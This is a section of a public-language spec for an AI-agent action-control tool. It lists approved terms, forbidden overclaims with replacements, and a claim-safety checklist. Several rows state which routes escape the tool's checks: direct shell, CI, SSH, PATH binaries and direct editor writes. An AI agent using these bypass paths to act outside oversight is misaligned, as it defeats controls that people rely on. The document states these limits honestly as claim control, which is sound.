> Do not use any term to upgrade a claim beyond
> `docs/CLAIMS_LEDGER.md`. **§12.3 is the single source for forbidden-phrase → replacement; prose
> sections cite it rather than re-listing.**

## 12.1 Approved nouns / preferred words (use freely, scoped to evidence)

`action boundary` · `routed agent tools` · `proposed action` · `agent intent` · `privileged tool` · `governed route` · `bypass path` · `verdict` (`allow | deny | warn | escalate | require_approval`) · `decision record` · `receipt-grade record` (hash-verifiable; not signed) · `tainted context` · `risk path` · `source` · `sink` · `mutation` · `capability` · `tool descriptor` · `descriptor lock` · `approval edge` · `escalation` · `protected adapter` · `preview adapter` · `production adapter` · `Secure MCP server` · `MCP Firewall` · `first production route` (MCP).

**Concrete verbs (preferred):** read · write · send · delete · deploy · refund · merge · mutate · exfiltrate.

## 12.2 Words to handle carefully

| Word | Rule |
|---|---|
| **governance** | Internal / ADR / org-name vocabulary ONLY. Never a public hook or category word. (C1) |
| **Fulcrum** (as subject) | Never the deciding subject. Use **"Boundary decides."** (R1) |
| **MCP Safety Gateway** | Campaign label only; never the project name. (C2) |
| **production** | Only the **MCP route**. SDK core / CLI mechanics / Action = `delivered`; everything else = `delivered-preview` / `preview` / `starter` / `local-only`. (C4) |
| **proof / proved** | Proof-correspondence and receipt **hash**-verification only. Runtime decisions are `deterministic`/`classified`, never `proved`. (C7) |
| **secure** | Only with a named boundary + evidence (e.g., "Secure GitHub **preview**"). Never "fully secures." |
| **prevents** | Avoid absolute prevention. Prefer "blocks this governed route when…". |
| **platform** | Avoid; implies the enterprise lane. |
| **receipt** | "Decision record" by default; "receipt-grade record" only with hashes; never "signed receipt." (C6) |

## 12.3 Forbidden phrases (FULL list — must NOT appear as public capability claims)

These may appear ONLY in claim-control, language-control, historical, or explicit-limitation context. For each, use the **replacement**.

**Category / identity (C1, C2)**
| Forbidden | Replacement |
|---|---|
| AI governance platform / AI Trust Platform | the action boundary for routed agent tools |
| governance kernel / pre-execution control plane (as public identity) | the action boundary for routed agent tools (developer tool) |
| GIL / Governance Interception Layer / Zero-Trust MCP Router (as project name) | Fulcrum Boundary (CLI: `boundary`) |
| "MCP Safety Gateway" used as the project name | "Fulcrum Boundary"; "MCP Safety Gateway" = campaign label only |

**Routed-only / scope (C9) — sharpest for CLI**
| Forbidden | Replacement |
|---|---|
| global shell control | project-local command governance for routed commands only |
| all CLI activity protected | governs commands routed through `boundary shell` / `boundary command run` / project-local shims |
| governs every way an agent can mutate | governs proposed actions only when the route is forced through Boundary |
| Boundary controls all shell commands | direct shell, CI, and SSH remain outside Boundary unless routed |
| Boundary protects direct shell access | Boundary governs routed command paths; direct PATH binaries are a bypass |
| Boundary controls all file writes / provides filesystem sandboxing | Edit Boundary governs edits routed through edit envelopes only |
| Boundary protects direct editor writes | direct editor/filesystem writes are a bypass unless routed |
| Boundary protects tools that bypass Boundary | Boundary governs routed tools; direct access is a bypass unless topology blocks it |

**Maturity (C4)**
| Forbidden | Replacement |
|---|---|
| all adapters production / six (or seven) production adapters | one production MCP adapter plus preview adapters tracked by readiness |
| production-grade pre-execution control plane (whole product) | one production MCP route; SDK core / CLI mechanics / Action are `delivered`; other surfaces are preview/starter/local-only |
| Boundary provides production command governance | preview project-local command governance for routed commands |
| Boundary provides production edit governance | preview Edit Boundary governance for routed edit envelopes |

**Universal-defense / overclaim**
| Forbidden | Replacement |
|---|---|
| prevents all prompt injection / universal prompt-injection prevention | blocks tested write-after-taint fixture attacks before execution |
| prevents all SQL injection | classifies and denies tested destructive SQL patterns in governed routes |
| SQL firewall | Postgres AST guard for routed requests |
| universal agent safety / guarantees universal agent safety | pre-execution control for governed tool routes |
| Boundary prevents every overeager agent action | blocks the governed route when a rule matches |
| no other tool does this | Boundary is designed to detect this specific pattern |
| the action-boundary demo proves all attacks blocked | the demo denies the tested write-after-taint fixture before upstream |
| redteam fixtures prove all MCP attacks are blocked | fixture redteams assert expected denials on tested paths |

**GitHub / Secure GitHub**
| Forbidden | Replacement |
|---|---|
| fully secures GitHub | governs supported GitHub actions routed through Boundary |
| production Secure GitHub / Secure GitHub is production | preview Secure GitHub profile until live conformance evidence exists |
| detects every malicious issue | detects configured taint sources and tested write-after-taint paths |
| live conformance proves deployment bypass resistance | live conformance does not close deployment bypasses |

**Decision artifacts / proof (C6, C7)**
| Forbidden | Replacement |
|---|---|
| cryptographic proof of verdict / signed receipt / signature (by default) | structured decision record; receipt-grade record (hash-verifiable, not signed) |
| proved decision / Boundary emits proved decisions | structured decision record; decisions are deterministic/classified |
| Boundary mechanically extracts runtime code from Lean proofs | proofs referenced by documented correspondence only |
| version output proves cryptographic release provenance | reports local version/build metadata; not cryptographic provenance |
| evidence bundles prove production safety | local evidence bundles; do not prove production deployment safety |
| doctor proves all routes protected | doctor reports routed-surface diagnostics only |

**Distribution / hosting (C10)**
| Forbidden | Replacement |
|---|---|
| hosted monitoring / dashboard monitors production deployments | dashboard reads local artifacts only |
| Homebrew / package-manager availability | local + `go install …@v0.9.0` only |

**Vendor (C8)**
| Forbidden | Replacement |
|---|---|
| any named competitor / third party in public copy | vendor-neutral shape language; "external MCP inventory NDJSON" |
| any "X cannot do this" / "uncopyable" construction | (delete) |

## 12.4 Approved release paragraph (verbatim-safe; from `docs/RELEASE_TRUTH_PUBLIC.md`, top-line adjusted)

> Fulcrum Boundary is the **action boundary for routed agent tools**. It inventories local MCP tool paths, renders risk paths, generates starter policies, runs safe fixture redteams, and denies governed privileged actions before execution **when those actions route through Boundary**. MCP is the first production route; Command Boundary, Edit Boundary, Secure GitHub, and the remaining adapters are preview, tracked per `adapters/<adapter>/readiness.yaml`.

---

## Spec-wide claim-safety self-check

- Every surface, command row, and adapter row carries a **status** ∈ {`production`, `delivered`, `delivered-preview`, `preview`, `starter`, `local-only`} + an **evidence pointer** (a `BND-CLAIM-*` ID and/or a verified repo path), checkable against `claims/boundary_claims.yaml`.
- The word **"production"** is applied **only** to the MCP route; the Go SDK core, CLI mechanics, and the GitHub Action (CI-local) are **`delivered`**, not "production"; preview adapters are `delivered-preview`/`preview`; `policy generate` = `starter`; `dashboard` = `local-only`. (C4/C5 — lock and labels agree.)
- No "governance / compliance / CISO / AI Trust Platform" framing; no "GIL / kernel / Zero-Trust Router" as identity. (C1/C2)
- No "proved" runtime claim; no "cryptographic proof of verdict"; no "global shell control / all CLI activity protected / governs every way an agent can mutate." (C6/C7/C9)
- Subject is **Boundary**, never Fulcrum, in every capability sentence. (R1)
- Vendor-neutral: no named third parties; the only named external concept is the public "lethal trifecta" mental model, scoped to the tested path. (C8)
- Distribution copy asserts only `go install …@v0.9.0` and a `local-only` dashboard. (C10)
- The routed-only doctrine and the two-lane spine are each stated **once canonically** (§10.0 and §4.0); every other reference cross-points to them. Each conflict-resolving section states its chosen side explicitly + exclusively with a `superseded:` predecessor (C1–C10, R1).

**This is the authoritative in-repo public-surface spec. It is a language-control document (§12 governs public language by quoting the forbidden phrases) and is exempt from the public-surface guard and language lint for that reason, alongside the lexicon and copy-rules docs.**
